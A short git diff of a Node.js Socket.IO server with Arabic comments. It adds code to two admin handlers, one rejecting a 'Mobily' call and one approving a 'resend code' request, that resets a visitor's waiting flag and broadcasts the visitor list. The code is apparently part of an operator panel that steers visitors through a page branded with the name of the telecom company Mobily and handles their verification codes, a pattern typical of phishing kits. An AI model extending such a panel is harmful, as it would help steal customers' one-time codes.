@@ -511,6 +511,13 @@ io.on("connection", (socket) => {
   // Admin: Reject Mobily call (special handling for Mobily page)
   socket.on("admin:mobilyReject", (visitorSocketId) => {
     io.to(visitorSocketId).emit("mobily:rejected");
+    // تحديث حالة الانتظار
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.waitingForAdminResponse = false;
+      visitors.set(visitorSocketId, visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
+    }
     console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
   });
 
@@ -568,6 +575,13 @@ io.on("connection", (socket) => {
   // Admin: Approve resend code request
   socket.on("admin:approveResend", ({ visitorSocketId }) => {
     io.to(visitorSocketId).emit("resend:approved");
+    // تحديث حالة الانتظار
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.waitingForAdminResponse = false;
+      visitors.set(visitorSocketId, visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
+    }
     console.log(`Resend approved for visitor ${visitorSocketId}`);
   });
 
